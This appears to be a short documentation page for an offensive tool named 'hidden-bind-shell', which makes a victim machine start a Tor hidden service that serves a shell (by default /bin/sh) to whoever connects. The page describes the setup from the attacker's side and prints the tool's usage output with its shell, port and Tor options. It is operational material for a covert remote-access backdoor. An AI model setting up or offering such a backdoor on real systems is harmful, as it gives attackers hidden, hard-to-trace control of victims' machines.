---
description: Victim starts up a Hidden Service with a Bind Shell.
---

# hidden-bind-shell

This tool allows the **victim to set up a new Hidden Service that serves shells to new connections**. Then, the attacker can connect to the Hidden Service to receive a shell session.

Some parameters need to be set:

```text
$ ./hidden-bind-shell -h
Usage of hidden-bind-shell:

  -bind-shell-program string
        Program to execute on bind-shell (default "/bin/sh")
  -data-dir string
        Where Tor data is stored. If not defined, a directory is created
  -hiddensrvport int
        Tor hidden service port where bind-shell will be started (default 80)
  -timeout int
        Timeout in seconds for Tor setup (default 180)
```

